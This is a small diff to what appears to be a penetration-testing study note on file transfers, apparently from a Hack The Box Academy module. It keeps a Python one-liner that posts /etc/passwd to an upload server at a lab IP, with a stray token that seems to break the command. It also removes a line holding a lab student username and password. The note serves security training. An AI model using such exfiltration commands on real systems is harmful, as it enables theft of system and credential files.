@@ -39,7 +39,6 @@ python3 -m uploadserver
 python3 -c whet'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
 
-htb-student | Password:HTB_@cademy_stdnt!)
 
 ## PHP
 
